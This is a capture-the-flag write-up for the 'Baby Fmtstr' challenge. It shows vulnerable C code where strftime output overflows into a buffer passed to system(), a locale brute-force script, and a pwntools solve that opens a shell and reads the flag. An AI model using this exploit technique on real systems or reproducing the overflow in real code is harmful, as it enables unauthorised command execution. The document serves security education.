### Baby Fmtstr (44 Solves, 335 Pts)
Baby Fmtstr takes the form of a simple exe. We can either set the `LC_TIME` value to some valid variable, or perform `print_time()` which prints out the time for us, except we get to input format specifiers. It uses `strftime()` on our format string, used to obtain various data involving the current time, and writes it into a global `output[32]` array. But wait! It writes up till `48` bytes in! Which means the remaining data would overflow into `command[32]`.

We also see `goodbye()`, called when we choose not to use either `print_time()` or `set_locale()`, which runs `system(command)`. If we could overflow `output[]` into `command[]`, we could perhaps figure a way to write `command[]` as `/bin/sh` for example, leading to `system("/bin/sh")` being called which would pop a shell.

```c
char output[0x20];
char command[0x20];

void goodbye(){
    puts("Adiós!");
    system(command); // change to /bin/sh
}

void print_time(){
    time_t now;
    struct tm *time_struct;
    char input[0x20];
    char buf[0x30];

    time(&now);
    time_struct = localtime(&now);

    printf("The time now is %d.\nEnter format specifier: ", now);
    fgets(input, 0x20, stdin);

    for(int i = 0; i < strlen(input)-1; i++){
        if(i % 2 == 0 && input[i] != '%'){ // every even i must be %
            puts("Only format specifiers allowed!");
            exit(0);
        }
    }

    strftime(buf, 0x30, input, time_struct); // std::size_t strftime( char* str, std::size_t count, const char* format, const std::tm* tp );
    // writes up to 48 bytes of data!
    // remove newline at the end
    buf[strlen(buf)-1] = '\0';

    memcpy(output, buf, strlen(buf)); // buf => 32 randoms + "/bin/sh\x00" would be ideal...
    printf("Formatted: %s\n", output);
}


void set_locale(){
    char input[0x20];
    printf("Enter new locale: ");
    fgets(input, 0x20, stdin);
    char *result = setlocale(LC_TIME, input);
    if(result == NULL){
        puts("Failed to set locale :(");
        puts("Run locale -a for a list of valid locales.");
    }else{
        puts("Locale changed successfully!");
    }
}
```

Looking at https://en.cppreference.com/w/cpp/chrono/c/strftime, we see a list of valid format strings that we can input. `strftime()` essentially reads these format strings and, if it reads `%Y` for example, outputs the year, `2024`. If it reads `%b`, it outputs the abbrieviated month, but interestingly, the output is 'locale dependent'.

The program implies using `locale -a` on our instance to list all valid locales, and with each locale we can test all locale dependent format strings till we find one that might help with getting `/bin/sh`.

Using a brute script such as,
```py
ss = """
...
tr_CY.utf8
tr_TR.utf8
uk_UA.utf8
uz_UZ.utf8
wa_BE.utf8
xh_ZA.utf8
yi_US.utf8
zh_CN.utf8
zh_HK.utf8
zh_SG.utf8
zh_TW.utf8
zu_ZA.utf8
"""

from pwn import *

context.log_level = "error"
for line in ss.split("\n"):
    if not line:
        continue
    for j in b"bBaApcxXrp":
        p = process('./fmtstr')
        p.sendlineafter(b'> ', b'2')
        p.sendlineafter(b'Enter new locale: ', line.encode())
        p.sendlineafter(b'> ', b'1')
        pload = b'%' + bytes([j])
        p.sendlineafter(b'Enter format specifier: ',pload)
        res = p.recvline().rstrip()
        if any([res.endswith(chr(i).encode()) for i in b'/binshcatflg*.tx']) or b'/' in res or b' ' in res:
            print(pload, line, res)
        p.close()
```

I found that `xh_ZA.utf8` has its month, or `%b` format, set to `Tsh\n`. This is great, as it allows us to write a payload ending with `sh\x00` (the binary itself overwrites `\n` with `\x00` NULL bytes)

And funny enough, this is sufficient! With some padding we can get `command[]` to contain `sh`, allowing us to pop a shell!

`solve.py`
```py
from pwn import *

r = remote('challs.nusgreyhats.org', 31234)
r.sendline(b'2')
r.sendline(b'xh_ZA.utf8')
r.sendline(b'1')
r.sendline(b'%V%b%b%b%x%x%b')
r.interactive()
```
```sh
[+] Opening connection to challs.nusgreyhats.org on port 31234: Done
[*] Switching to interactive mode
Welcome to international time converter!
Menu:
1. Print time
2. Change language
3. Exit
> Enter new locale: Locale changed successfully!

Welcome to international time converter!
Menu:
1. Print time
2. Change language
3. Exit
> The time now is 1713716330.
Enter format specifier: Formatted: 16TshTshTsh21/04/202421/04/2024Tsh

Welcome to international time converter!
Menu:
1. Print time
2. Change language
3. Exit
> $ 3
Adiós!
$ ls
flag.txt
run
$ cat flag.txt
grey{17'5_b0f_71m3}$
[*] Interrupted
[*] Closed connection to challs.nusgreyhats.org port 31234
```